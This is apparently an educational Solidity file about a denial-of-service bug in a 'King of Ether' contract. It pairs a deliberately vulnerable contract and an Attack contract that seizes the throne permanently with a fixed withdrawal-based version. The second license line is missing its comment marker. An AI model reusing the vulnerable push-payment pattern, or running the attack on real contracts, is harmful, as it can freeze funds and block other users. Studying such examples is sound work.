//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;


/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/


contract KingOfEther{
	address public king;
	uint256 public balance;

	function claimThrone() external payable {
		require(msg.value > balance,"need to pay more to become the king");

		(bool sent,) = king.call{value: balance}("");
		require(sent, "Failed to send Ether");

		balance = msg.value;
		king = msg.sender;
	}	
}

contract Attack {
	
	KingOfEther kingOfEther;

	constructor(KingOfEther _kingOfEther){
		kingOfEther = KingOfEther(_kingOfEther);
	}

	//function () external payable{
	// assert(false)
	//}

	function attack() public payable {
		kingOfEther.claimThrone{value: msg.value}();
	}
}


/*

Preventative Techniques
One way to prevent this is to allow the users to withdraw their Ether instead of sending it.
*/

SPDX-License-Identifier:MIT
pragma solidity ^0.8.24;

contract KingOfEther{
	address public king;
	uint256 public balance;
	mapping(address => uint256) public balances;

	function claimThrone() external payable{
		require(msg.value > balance, "need to pay more to become the king");

		balances[king] += balance;

		balance = msg.value;
		king = msg.sender;
	}

	function withdraw() public {
		require(msg.sender != king, "current king cannot withdraw");

		uint256 amount = balances[msg.sender];
		balances[msg.sender] = 0;

		(bool  sent,) = msg.sender.call{value: amount}("");
		require (sent, "Failed to send ether");
	}
}